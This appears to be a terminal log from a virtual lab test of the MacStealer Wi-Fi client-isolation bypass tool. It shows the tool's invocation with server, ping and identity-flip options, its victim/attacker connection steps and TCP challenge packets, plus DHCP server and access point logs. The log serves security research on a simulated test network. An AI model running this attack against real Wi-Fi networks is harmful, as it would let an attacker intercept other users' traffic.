(venv) root@dell:/home/martin/Repos/wifi-vulnerabilities-analysis/queue-security-context/mecstealer-virtual/research# ./macstealer.py wlan1 --server 192.168.100.10 --ping --flip
[16:48:33] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
[16:48:33] Starting wpa_supplicant using: ../wpa_supplicant/wpa_supplicant -Dnl80211 -i wlan1 -c client.conf -W
Successfully initialized wpa_supplicant
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: Could not set interface 'p2p-dev-wlan1' UP
nl80211: deinit ifname=p2p-dev-wlan1 disabled_11b_rates=0
p2p-dev-wlan1: Failed to initialize driver interface
p2p-dev-wlan1: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
[16:48:33] Switching the victim and attacker identities.
[16:48:33] Scanning for network and connecting as victim user...
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
wlan1: SME: Trying to authenticate with 02:00:00:00:00:00 (SSID='testnetwork' freq=2412 MHz)
wlan1: Trying to associate with 02:00:00:00:00:00 (SSID='testnetwork' freq=2412 MHz)
wlan1: Associated with 02:00:00:00:00:00
wlan1: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan1: WPA: Key negotiation completed with 02:00:00:00:00:00 [PTK=CCMP GTK=CCMP]
wlan1: CTRL-EVENT-CONNECTED - Connection to 02:00:00:00:00:00 completed [id=0 id_str=attacker]
[16:48:40] Sending DHCP discover with XID 786868374
[16:48:40] Received DHCP offer for 192.168.100.34, sending DHCP request.
[16:48:40] Sending DHCP request with XID 786868374
[16:48:40] DHCP ACK: Got IP address 192.168.100.34/02:00:00:00:01:00 with router at 192.168.100.1/02:00:00:00:00:00.
[16:48:40] Transmitting challenge TCP SYN packet to 192.168.100.10:443
[16:48:40] Transmitted packet: <Ether  dst=02:00:00:00:00:00 src=02:00:00:00:01:00 type=IPv4 |<IP  frag=0 proto=tcp src=192.168.100.34 dst=192.168.100.10 |<TCP  sport=9672 dport=https seq=848269373 |>>>
[16:48:40] Transmitted packet: <Ether  dst=02:00:00:00:00:00 src=02:00:00:00:01:00 type=IPv4 |<IP  frag=0 proto=tcp src=192.168.100.34 dst=192.168.100.10 |<TCP  sport=9672 dport=https seq=848269373 |>>>
[16:48:40] Received TCP response: <Ether  dst=02:00:00:00:01:00 src=02:00:00:00:00:00 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=0 flags=DF frag=0 ttl=64 proto=tcp chksum=0xf152 src=192.168.100.10 dst=192.168.100.34 |<TCP  sport=https dport=9672 seq=0 ack=848269374 dataofs=5 reserved=0 flags=RA window=0 chksum=0x7c02 urgptr=0 |>>>
[16:48:40] Received SYN/ACK 0.0010023117065429688 seconds after sending SYN.
[16:48:40] Received TCP response: <Ether  dst=02:00:00:00:01:00 src=02:00:00:00:00:00 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=0 flags=DF frag=0 ttl=64 proto=tcp chksum=0xf152 src=192.168.100.10 dst=192.168.100.34 |<TCP  sport=https dport=9672 seq=0 ack=848269374 dataofs=5 reserved=0 flags=RA window=0 chksum=0x7c02 urgptr=0 |>>>
[16:48:40] Received SYN/ACK 0.0065686702728271484 seconds after sending SYN.
[16:48:45] 02:00:00:00:00:00: ARP: Ether / ARP who has 192.168.100.34 says 192.168.100.1 ==> Ether / ARP is at 02:00:00:00:01:00 says 192.168.100.34 on wlan0
[16:49:00] >>> Ping test done. Consider using a server that retransmits SYN/ACK for a longer time.
[16:49:00] Closing daemon and cleaning up ...
wlan1: CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:00:00 reason=3 locally_generated=1
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
nl80211: deinit ifname=wlan1 disabled_11b_rates=0
wlan1: CTRL-EVENT-TERMINATING 
(venv) root@dell:/home/martin/Repos/wifi-vulnerabilities-analysis/queue-security-context/mecstealer-virtual/research# 


DHCP:
❯ sudo ./dnsmasq-start.sh
[*] Writing dnsmasq.conf
[*] Starting dnsmasq (foreground)
dnsmasq: started, version 2.90 DNS disabled
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.100.10 -- 192.168.100.200, lease time 8h
dnsmasq-dhcp: DHCPDISCOVER(wlan0) 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPOFFER(wlan0) 192.168.100.34 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPREQUEST(wlan0) 192.168.100.34 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPACK(wlan0) 192.168.100.34 02:00:00:00:01:00 fragclient

AP:

❯ sudo hostapd hostapd.conf -i wlan0
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
wlan0: STA 02:00:00:00:01:00 IEEE 802.11: authenticated
wlan0: STA 02:00:00:00:01:00 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED 02:00:00:00:01:00
wlan0: STA 02:00:00:00:01:00 RADIUS: starting accounting session 5A5439EFA933D1AA
wlan0: STA 02:00:00:00:01:00 WPA: pairwise key handshake completed (RSN)
wlan0: EAPOL-4WAY-HS-COMPLETED 02:00:00:00:01:00
wlan0: AP-STA-DISCONNECTED 02:00:00:00:01:00


